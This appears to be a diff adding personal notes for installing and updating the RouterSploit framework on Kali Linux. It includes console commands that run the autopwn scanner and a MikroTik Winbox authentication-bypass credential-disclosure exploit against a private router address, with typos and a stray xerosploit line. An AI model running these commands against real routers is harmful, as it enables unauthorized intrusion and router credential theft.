@@ -1,0 +1,41 @@
+Installation on Kali Linux
+
+apt-get install python3-pip
+git clone https://www.github.com/threat9/routersploit
+cd routersploit
+python3 -m pip install -r requirements.txt
+python3 rsf.py
+
+===========================================
+search autopwn
+use scanners/autopwn
+set threads 30
+set target 192.168.88.1
+run
+back
+search tplink
+
+use exploits/routers/mikrotik/winbox_auth_bypass_creds_disclosure
+show options
+et target 192.168.88.1
+run
+=====================================================================
+
+
+
+Bluetooth Low Energy support:
+
+apt-get install libglib2.0-dev
+python3 -m pip install bluepy
+python3 rsf.py
+
+-----------
+Update 
+-----------
+sudo python install.py
+sudo xerosploit
+cd routersploit
+git pull
+-----------------------------
+
+use Scanners/autopwn
